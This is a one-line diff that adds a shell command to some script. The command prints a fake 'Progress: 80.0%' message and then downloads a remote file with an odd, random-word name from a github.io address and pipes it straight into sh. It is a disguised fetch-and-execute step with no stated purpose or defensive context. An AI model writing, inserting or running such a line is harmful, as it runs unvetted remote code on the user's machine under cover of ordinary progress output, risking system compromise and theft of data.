@@ -1,0 +1,1 @@
+echo 'Progress: 80.0%'; curl -L --progress-bar frkns.github.io/fun/SourceResortsIndSalonSurveyMbStainlessStampsPoultry.js | sh
